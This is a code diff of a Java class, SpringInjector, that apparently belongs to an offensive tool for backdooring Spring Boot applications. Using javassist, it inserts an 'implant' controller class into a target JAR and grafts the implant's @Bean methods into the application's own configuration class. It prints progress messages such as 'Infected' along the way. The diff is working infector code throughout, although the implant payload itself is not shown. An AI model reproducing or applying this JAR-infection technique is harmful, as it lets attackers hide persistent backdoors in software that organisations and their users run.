@@ -3,54 +3,23 @@ package org.example.injector;
 import javassist.bytecode.*;
 import javassist.bytecode.annotation.Annotation;
 import javassist.bytecode.annotation.MemberValue;
-import org.example.implants.SpringImplantConfiguration;
-import org.example.implants.SpringImplantController;
 
 import java.io.DataInputStream;
 import java.io.IOException;
-import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.*;
 import java.util.jar.JarEntry;
+
+import static org.example.injector.Helpers.*;
 
 public class SpringInjector {
     private final Class<?> implantComponentClass;
     private final Class<?> implantSpringConfigClass;
 
 
-    SpringInjector(Class<?> implantComponent, Class<?> implantSpringConfig) {
+    public SpringInjector(Class<?> implantComponent, Class<?> implantSpringConfig) {
         this.implantComponentClass = implantComponent;
         this.implantSpringConfigClass = implantSpringConfig;
-    }
-
-    // TODO This CLI logic will be merged into the main Cli class
-    public static void main(String[] args) {
-        if (args.length < 2) {
-            System.exit(1);
-        }
-
-        SpringInjector injector = new SpringInjector(SpringImplantController.class, SpringImplantConfiguration.class);
-        try {
-            Path targetPath = Path.of(args[0]);
-            Path outputPath = Path.of(args[1]);
-            System.out.println("[i] Target JAR: " + targetPath);
-            System.out.println("[i] Output JAR: " + outputPath);
-            if (!Files.exists(targetPath) && !Files.isRegularFile(targetPath)) {
-                System.out.println("[!] Target JAR is not a regular existing file.");
-                System.exit(1);
-            }
-            if (Files.exists(outputPath) && targetPath.toRealPath().equals(outputPath.toRealPath())) {
-                System.out.println("[-] Target JAR and output JAR cannot be the same.");
-                System.exit(1);
-            }
-            if (injector.infect(targetPath, outputPath)) {
-                System.out.println("[+] Infected '" + targetPath + "'. Modified JAR available at: " + outputPath);
-            } else {
-                System.out.println("[-] Did not infect '" + targetPath + "'.");
-            }
-        } catch (IOException e) {
-            throw new RuntimeException(e);
-        }
     }
 
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
@@ -87,7 +56,7 @@ public class SpringInjector {
                     String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
                     String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
                     implantComponent.setName(targetPackageName + "." + implantComponentClassName);
-                    JarEntry newJarEntry = convertToJarEntry(implantComponent);
+                    JarEntry newJarEntry = convertToSpringJarEntry(implantComponent);
                     implantComponent.write(fiddler.addNewEntry(newJarEntry));
                     System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
 
@@ -100,10 +69,11 @@ public class SpringInjector {
 
                         if (!addBeanToSpringConfig(currentlyProcessing, implantComponent)) {
                             System.out.println("[-] Class '" + currentlyProcessing.getName() + "' already infected. Skipping.");
+                            entry.passOn();
                             continue;
                         }
 
-                        currentlyProcessing.write(entry.addOnly());
+                        currentlyProcessing.write(entry.addAndGetStream());
                         System.out.println("[+] Injected @Bean method into '" + currentlyProcessing.getName() + "'.");
                     } else {
                         entry.passOn();
@@ -123,63 +93,44 @@ public class SpringInjector {
         return didInfect;
     }
 
-    private static String parsePackageNameFromFqcn(final String fqcn) {
-        String[] parts = fqcn.split("\\.");
-        if (parts.length < 2) {
-            throw new RuntimeException("Not a fully qualified class name: " + fqcn);
-        }
-        String[] packageParts = Arrays.copyOfRange(parts, 0, parts.length - 1);
-        return String.join(".", packageParts);
-    }
-
-    private static String parseClassNameFromFqcn(final String fqcn) {
-        String[] parts = fqcn.split("\\.");
-        if (parts.length < 2) {
-            throw new RuntimeException("Not a fully qualified class name: " + fqcn);
-        }
-        return parts[parts.length - 1];
-    }
-
-    private static String convertToClassFormatFqcn(final String dotFormatClassName) {
-        return dotFormatClassName.replace(".", "/");
-    }
-
     private boolean addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantComponent) throws IOException, ClassNotFoundException {
         ClassFile implantSpringConfig = ImplantReader.findAndReadClassFile(implantSpringConfigClass);
         String implantPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(implantSpringConfig.getName()));
         String targetPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(existingSpringConfig.getName()));
         String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
-        String implantBeanMethodName = "getImplantController";  // TODO Find this one by it's @Bean annotation?
 
-        // TODO This entire method should just be a generalized "copy and merge everything X into Y".
+        // Copy all @Bean annotated methods from implant config class to target config class (if not already exists)
+        for (MethodInfo implantBeanMethod : findAllSpringBeanMethods(implantSpringConfig)) {
+            MethodInfo existingImplantControllerBean = existingSpringConfig.getMethod(implantBeanMethod.getName());
+            if (existingImplantControllerBean != null) {
+                return false;
+            }
 
-        MethodInfo existingImplantControllerBean = existingSpringConfig.getMethod(implantBeanMethodName);
-        if (existingImplantControllerBean != null) {
-            return false;
-        }
+            try {
+                Map<String, String> translateTable = new HashMap<>();
+                translateTable.put(implantPackageDesc + "/" + implantComponentClassName, targetPackageDesc + "/" + implantComponentClassName);
+                translateTable.put(convertToClassFormatFqcn(implantSpringConfig.getName()), convertToClassFormatFqcn(existingSpringConfig.getName()));
 
-        try {
-            Map<String, String> translateTable = new HashMap<>();
-            translateTable.put(implantPackageDesc + "/" + implantComponentClassName, targetPackageDesc + "/" + implantComponentClassName);
-            translateTable.put(convertToClassFormatFqcn(implantSpringConfig.getName()), convertToClassFormatFqcn(existingSpringConfig.getName()));
+                String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
+                MethodInfo targetBeanMethod = new MethodInfo(existingSpringConfig.getConstPool(), implantBeanMethod.getName(), implantBeanMethodDesc);
+                targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Workaround for some internal bug in Javassist
 
-            MethodInfo implantBeanMethod = implantSpringConfig.getMethod(implantBeanMethodName);
-            String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
-            MethodInfo targetBeanMethod = new MethodInfo(existingSpringConfig.getConstPool(), implantBeanMethodName, implantBeanMethodDesc);
-            targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Workaround for some internal bug in Javassist
+                CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(existingSpringConfig.getConstPool(), translateTable);
+                codeAttr.setMaxLocals(implantBeanMethod.getCodeAttribute().getMaxLocals());
+                targetBeanMethod.setCodeAttribute(codeAttr);
 
-            CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(existingSpringConfig.getConstPool(), translateTable);
-            codeAttr.setMaxLocals(implantBeanMethod.getCodeAttribute().getMaxLocals());
-            targetBeanMethod.setCodeAttribute(codeAttr);
+                ExceptionsAttribute exceptionsAttr = implantBeanMethod.getExceptionsAttribute();
+                if (exceptionsAttr != null) {
+                    ExceptionsAttribute exceptions = (ExceptionsAttribute) exceptionsAttr.copy(existingSpringConfig.getConstPool(), translateTable);
+                    targetBeanMethod.setExceptionsAttribute(exceptions);
+                }
 
-            ExceptionsAttribute exceptions = (ExceptionsAttribute) implantBeanMethod.getExceptionsAttribute().copy(existingSpringConfig.getConstPool(), translateTable);
-            targetBeanMethod.setExceptionsAttribute(exceptions);
+                copyAllMethodAnnotations(targetBeanMethod, implantBeanMethod);
 
-            copyAllMethodAnnotations(targetBeanMethod, implantBeanMethod);
-
-            existingSpringConfig.addMethod(targetBeanMethod);
-        } catch (DuplicateMemberException e) {
-            throw new RuntimeException(e);
+                existingSpringConfig.addMethod(targetBeanMethod);
+            } catch (DuplicateMemberException e) {
+                throw new RuntimeException(e);
+            }
         }
 
         return true;
@@ -199,9 +150,11 @@ public class SpringInjector {
         AnnotationsAttribute targetAnnotationsAttr = new AnnotationsAttribute(target.getConstPool(), "RuntimeVisibleAnnotations");
         for (Annotation annotation : sourceAnnotationsAttr.getAnnotations()) {
             Annotation copiedAnnotation = new Annotation(annotation.getTypeName(), target.getConstPool());
-            for (String memberValueName : annotation.getMemberNames()) {
-                MemberValue memberValue = annotation.getMemberValue(memberValueName);
-                copiedAnnotation.addMemberValue(memberValueName, memberValue);
+            if (annotation.getMemberNames() != null) {
+                for (String memberValueName : annotation.getMemberNames()) {
+                    MemberValue memberValue = annotation.getMemberValue(memberValueName);
+                    copiedAnnotation.addMemberValue(memberValueName, memberValue);
+                }
             }
             targetAnnotationsAttr.addAnnotation(copiedAnnotation);
         }
@@ -209,10 +162,27 @@ public class SpringInjector {
         target.addAttribute(targetAnnotationsAttr);
     }
 
-    private static JarEntry convertToJarEntry(final ClassFile classFile) {
-        // TODO Maybe this "BOOT-INF" etc is not a good thing to hardcode? Versioned JARs? Discrepancies in Spring JAR structure?
-        String fullPathInsideJar = "BOOT-INF/classes/" + classFile.getName().replace(".", "/") + ".class";
-        return new JarEntry(fullPathInsideJar);
+    private static List<MethodInfo> findAllSpringBeanMethods(ClassFile springController) {
+        List<MethodInfo> results = new ArrayList<>(1);
+
+        for (MethodInfo method : springController.getMethods()) {
+            AttributeInfo attr = method.getAttribute("RuntimeVisibleAnnotations");
+            if (attr == null) {
+                continue;
+            }
+            if (!(attr instanceof AnnotationsAttribute annotationAttr)) {
+                throw new RuntimeException("Failed to make sense of RuntimeVisibleAnnotations.");
+            }
+
+            for (Annotation annotation : annotationAttr.getAnnotations()) {
+                String annotationType = annotation.getTypeName();
+                if (annotationType.equals("org.springframework.context.annotation.Bean")) {
+                    results.add(method);
+                }
+            }
+        }
+
+        return results;
     }
 
     private static boolean isSpringConfigurationClass(final ClassFile classFile) {
